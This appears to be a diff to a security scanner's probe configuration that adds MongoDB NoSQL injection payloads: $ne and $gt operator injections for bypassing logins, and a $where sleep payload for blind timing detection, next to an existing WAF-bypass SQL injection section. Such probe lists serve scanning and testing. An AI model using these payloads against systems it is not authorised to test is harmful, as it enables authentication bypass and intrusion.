@@ -357,6 +357,45 @@
         }
       ]
     },
+    "nosql": {
+      "description": "NoSQL injection probes targeting MongoDB — operator injection for auth bypass and blind timing attacks",
+      "tech_match": ["MongoDB", "Express", "Node.js", "Mongoose"],
+      "param_match": ["username", "password", "email", "login", "user", "filter"],
+      "probes": [
+        {
+          "payload": "{\"$ne\":\"\"}",
+          "description": "MongoDB $ne operator injection — bypasses login by matching all documents where field is not empty",
+          "matchers": [
+            {"type": "word", "words": ["true"], "condition": "or"},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$gt\":\"\"}",
+          "description": "MongoDB $gt operator injection — matches all documents where field is greater than empty string (auth bypass variant)",
+          "matchers": [
+            {"type": "word", "words": ["true"], "condition": "or"},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$where\":\"sleep(5000)\"}",
+          "description": "MongoDB $where time-based blind injection — server-side JavaScript execution via sleep confirms injection",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
     "waf_bypass": {
       "description": "WAF bypass SQL injection payloads — MySQL version comments, URL-encoded keywords from HackTricks",
       "tech_match": ["MySQL", "Apache", "PHP"],
